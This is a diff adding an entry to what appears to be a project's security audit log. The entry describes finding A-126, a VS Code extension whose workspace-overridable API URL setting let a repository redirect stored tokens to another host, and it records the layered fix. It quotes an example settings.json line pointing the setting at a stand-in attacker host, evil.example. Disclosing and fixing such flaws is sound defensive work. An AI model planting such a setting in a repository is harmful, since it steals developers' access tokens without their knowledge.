@@ -949,6 +949,46 @@ hundreds of assertions. Counts and "the fix is X" statements are the two kinds
 that rot, because the code they describe keeps moving. Prefer checking a
 mechanism over checking a string, and never assert against a file's prose.
 
+## Resolved 2026-08-09 (eighteenth pass) — A-126, token exfiltration via a workspace setting
+
+**A-126 — a repository could repoint the VS Code extension's API origin and
+collect the developer's tokens.** The extension stores its access and refresh
+tokens correctly, in `vscode.SecretStorage`. It then sent them to whatever
+`waitlayer.apiUrl` said — and that setting had **no `scope`**, so it defaulted to
+`window`, which is workspace-overridable, and `getApiUrl()` applied **no
+validation** to the value.
+
+Opening a repository containing
+
+```json
+{ "waitlayer.apiUrl": "https://evil.example/api/v1" }
+```
+
+in `.vscode/settings.json` was enough. No prompt, no interaction beyond opening
+the folder. The extension also declared no `capabilities.untrustedWorkspaces`,
+so it ran unrestricted in a folder VS Code itself considered untrusted.
+
+Fixed in three layers:
+
+1. **`scope: machine`** on `waitlayer.apiUrl`, `attestationProvider`,
+   `attestationProviderUrl` and `environmentKind` — VS Code then refuses to read
+   workspace-level values for them at all. This is the actual fix.
+2. **Runtime validation** in `getApiUrl()`: the value must parse, and must be
+   `https` unless it is loopback (where there is no network to intercept).
+   Anything else logs and falls back to production. A setting that carries a
+   credential should not be trusted on scope alone.
+3. **Workspace Trust declared** — `untrustedWorkspaces: limited`, listing those
+   four settings as restricted.
+
+Eleven cases pinned, including `file:`, `javascript:` and `ftp:` schemes, remote
+plain HTTP, and a malformed value. Note what is deliberately still allowed: any
+**https** origin. A user editing their own machine settings may point the
+extension anywhere they like; the vulnerability was that a *workspace* could.
+
+**The CLI's equivalent was already correct** — `resolveApiBaseUrl` returns the
+production origin on both branches and never reads workspace state. Only the
+extension had the workspace-scope surface.
+
 ## Resolved 2026-08-09 (seventeenth pass) — A-125, a guard that never fired
 
 **A-125 — the CLI's fail-closed credential guard was unreachable for the users
